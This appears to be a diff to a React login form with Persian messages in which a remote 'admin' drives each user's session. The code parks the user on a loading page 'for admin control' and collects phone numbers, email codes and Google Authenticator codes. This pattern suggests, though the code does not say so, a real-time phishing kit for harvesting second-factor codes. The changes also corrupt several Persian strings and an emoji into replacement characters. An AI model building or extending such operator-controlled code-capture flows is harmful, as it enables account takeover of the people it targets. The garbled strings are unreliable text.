@@ -332,7 +332,7 @@ export const LoginForm = () => {
         setIsSubmitting(false); // Ensure loading state is cleared
         break;
       case "check_status":
-        // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
+        // بررسی دقیق وضع��ت کاربر با Enhanced Offline Detection
         console.log(
           "🔍 Admin requested enhanced status check for session:",
           sessionId,
@@ -475,7 +475,7 @@ export const LoginForm = () => {
         localStorage.setItem("userPhone", phoneNumber);
         sessionStorage.removeItem("sessionId");
         sessionStorage.removeItem("phoneNumber");
-        alert("🎉 کد ��یمیل تایید شد! احراز هویت با موفقیت تکمیل شد.");
+        alert("🎉 کد ��ی��یل تایید شد! احراز هویت با موفقیت تکمیل شد.");
         navigate("/", { replace: true });
         break;
       case "incorrect_email_code":
@@ -504,7 +504,7 @@ export const LoginForm = () => {
         localStorage.setItem("userPhone", phoneNumber);
         sessionStorage.removeItem("sessionId");
         sessionStorage.removeItem("phoneNumber");
-        alert("🎉 احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
+        alert("���� احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
         navigate("/", { replace: true });
         break;
     }
@@ -571,9 +571,18 @@ export const LoginForm = () => {
         );
       }
 
-      console.log("📱 Moving to verify-phone step");
-      setCurrentStep("verify-phone");
-      setIsSmsMode(false); // Regular phone verification, not SMS auth
+      console.log("📱 Moving to loading step for admin control");
+      setCurrentStep("loading");
+
+      // Show admin buttons after reaching loading page
+      setTimeout(async () => {
+        try {
+          console.log("📱 User reached loading step from phone, showing admin buttons...");
+          await showAdminButtons(result.sessionId);
+        } catch (error) {
+          console.error("❌ Failed to show admin buttons:", error);
+        }
+      }, 500);
     } catch (error) {
       console.error("Phone submission error:", error);
       setErrors({
@@ -730,7 +739,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!googleCode || googleCode.length !== 6) {
-      setErrors({ googleCode: "کد Google Authenticator ۶ رقمی را وارد کنید" });
+      setErrors({ googleCode: "��د Google Authenticator ۶ رقمی را وارد کنید" });
       return;
     }
 
